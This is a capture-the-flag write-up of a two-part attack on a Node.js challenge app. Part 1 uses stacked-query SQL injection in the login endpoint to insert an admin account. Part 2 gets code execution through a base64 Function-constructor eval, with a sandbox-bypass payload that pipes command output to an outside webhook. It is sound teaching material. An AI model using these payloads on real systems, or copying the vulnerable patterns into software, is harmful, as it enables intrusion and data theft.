# Fawazeer Cyber - L33T Challenge writeup

## **Part 1**

Starting the challenge and reading the source code of `server.js`, you can observe that the application uses prepared queries ‘almost’ everywhere in the code.

For example :

Register endpoint

```jsx
app.post('/api/register', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password are required' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    
    db.run('INSERT INTO users (username, password, role) VALUES (?, ?, ?)', 
      [username, hashedPassword, 'user'], 
      function(err) {
        if (err) {
          if (err.message.includes('UNIQUE constraint failed')) {
            return res.status(400).json({ error: 'Username already exists' });
          }
          return res.status(500).json({ error: err.message });
        }
```

Tasks endpoint

```jsx
app.get('/api/tasks', authenticateToken, authorizeRole('admin'), (req, res) => {
  let query = 'SELECT * FROM tasks';
  let params = [];
  
  if (req.user.role !== 'admin') {
    query += ' WHERE user_id = ?';
    params.push(req.user.id);
  }
  
  db.all(query, params, (err, tasks) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json(tasks);
  });
});
```

However, that’s not the case for the Login endpoint.

```jsx
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required' });
  }
  db.exec(`SELECT last_login FROM users WHERE username = '${username}' ;`, (err) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
```

When querying the `last_login` column from the database, the user input is directly embedded into the SQL string. That’s clearly vulnerable to **SQL Injection**.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Now, because the application is using `db.exec`, this is considered a **Stacked Queries SQL Injection.**

Which basically means you can terminate the current query and start another one by using `;` :

```sql
'; INSERT INTO users(username,password,role) VALUES ('yonkoadmin', 'password', 'admin') --
```

But you can’t simply do that, because of the `bcrypt.compare` in the Login endpoint :

```sql
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required' });
  }
  db.exec(`SELECT last_login FROM users WHERE username = '${username}' ;`, (err) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    db.get('SELECT * FROM users WHERE username = ?', [username], async (err, user) => {  
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
      }
      const validPassword = await bcrypt.compare(password, user.password);
```

This will compare the hash of the user in the database with the hash of the user you entered, so you need to `INSERT` **the hash of the password** not **the plain text** **password.** Now I’m not going to give a cryptography lesson here, if you didn’t get it just google it.

We can observe that in the register endpoint, the salt used is 10 salt rounds :

```
app.post('/api/register', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password are required' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
```

Now let’s hash our password :

```jsx
const bcrypt = require('bcryptjs');

bcrypt.hash("mypassword", 10, (err, hashedPassword) => {
    console.log(hashedPassword);
}
)
```

the output is : `$2a$10$PJ1ERREt/nf8TbM63.98r.OL1zoRg.HaYDHlrPJ.Ti2qcgiosYRC6`

Now we can inject our query again with the hashed password :

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Logging in :

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

That’s it for this part.

## **Part 2**

Since we have admin access, let's focus on the endpoints that require it, those are usually juicy, right?

I will assume that you’ve gone through all of them. So, what did you conclude?

Unexploitable?

Nope :

```jsx
app.get('/api/tasks/:id', authenticateToken, authorizeRole('admin'), (req, res) => {
  const taskId = req.params.id;
  let query = 'SELECT id, * FROM tasks WHERE id = ?';
  let params = [taskId];
  
  // Check if the user is not an admin
  if (req.user.role !== 'admin') {
    query += ' AND user_id = ?';
    params.push(req.user.id); 
  }
  
  db.all(query, params, (err, tasks) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    if (tasks.length === 0) {
      return res.status(404).json({ error: 'Task not found' });
    }

    tasks_viewer(tasks[0].description); 

    res.json(tasks);
  });
});
```

The `GET tasks` endpoint has an interesting function call `tasks_viewer(tasks[0].description)` .

Lets check it out, but first you need to `npm install` in the same directory of `package.json` .

```jsx
const atob = (str) => Buffer.from(str, 'base64').toString('utf8');
const btoa = (str) => Buffer.from(str).toString('base64');

let config = {
  verbose: false
};

function tasks_viewer(encodedInput) {
  try{
    let input = atob(encodedInput);
    let hiddenFunc = Function["constructor"]("return " + input)();  
    return hiddenFunc();
  }
  catch(e){
    return e;
  }
}
```

Well, that’s perfect.

Your `BASE64 input` is being passed to a function and this function is a [**Self-Invoking Function.**](https://samah-gaber.medium.com/self-invoking-functions-in-javascript-ea6ee39ba4d8)

Which means it will call itself immediately, and the way it passes our input to it is more like an `eval`.

Lets pull this function to a separate file to test our payloads:

```jsx
function tasks_viewer(encodedInput) {
    // let input = atob(encodedInput);
    let input = encodedInput;

    let hiddenFunc = Function["constructor"]("return " + input)();  
    return hiddenFunc();

}

console.log(tasks_viewer("input"));
```

Now if you’ve tried something like this as `input` :

```jsx
require('child_process').execSync('ls -la')
```

It won’t work, you will get a `ReferenceError: require is not defined` .

because the function operates in global scope while `require` is [local to the module and not global.](https://stackoverflow.com/questions/51164425/require-inside-new-function/51164539#51164539)

Basically this seems like a sandbox ( it’s not ) but it can be easily bypassed by googling [`JS sandbox bypass`](https://medium.com/faraday/bypassing-a-restrictive-js-sandbox-d2d13e02e542) , and soon you will land on this payload :

```jsx
process.mainModule.constructor._load('child_process').execSync('id | curl -d @- <https://webhook.site/fb15c2dd-73e5-4b13-b606-30e2a97c074d>')
```

Note : we’re using webhook to exfiltrate the data, because the website doesn’t return the output.

You will see an error in the console, but ignore it, you got what you want ( check your webhook ).

Now that everything is working we just need to construct our request to `/api/tasks` :

Don’t forget to base64 your payload.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

The task ID is 2, by going to `/api/tasks/2` , the payload will be passed to the `tasks_viewer` function and we will be done.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

[![Follow @CalledSTRIKER in X](https://img.shields.io/badge/Follow-@CalledSTRIKER-1DA1F2?logo=X\&logoColor=white)](https://x.com/CalledSTRIKER) [![Follow @CalledSTRIKER on GitHub](https://img.shields.io/badge/Follow-@CalledSTRIKER-181717?logo=github\&logoColor=white)](https://github.com/CalledSTRIKER)
